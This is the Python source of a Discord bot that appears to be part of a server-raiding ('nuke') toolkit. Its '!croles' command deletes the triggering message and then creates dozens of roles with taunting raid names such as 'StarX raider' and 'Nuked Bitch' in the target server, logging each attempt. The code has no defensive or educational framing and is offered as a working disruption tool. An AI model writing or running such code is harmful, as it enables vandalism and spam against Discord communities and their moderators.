from fileinput import close
import discord
from discord.ext import commands
import colorama
import random
from colorama import Fore
from colorama import Style
import Start
colorama.init()

client = discord.Client() 
client = discord.Client()
client = commands.Bot(command_prefix="!")
random_role = ("StarX", "StarX.Spamed", "StarX.raider", "starX", "StarX geño", "StarXed", "StarS on StarX", "Nuked Bitch")

repeats = 50
@client.command()
async def croles(ctx):
                    print('Logged in as:\n{0.user.name}\n{0.user.id}'.format(client))
                    await ctx.message.delete()
                    guild = ctx.guild
                    for role in guild.roles:
                        for i in range(0,repeats):
                            try:
                                await guild.create_role(name= random.choice(random_role))
                                print(Fore.MAGENTA + f"{role.name} was created." + Fore.RESET)
                            except:
                                print(Fore.GREEN + f"{role.name} was NOT created." + Fore.RESET)
                        return Start.welcome()
        

f = open("token.txt", "r")
token = f.read()
client.run(token)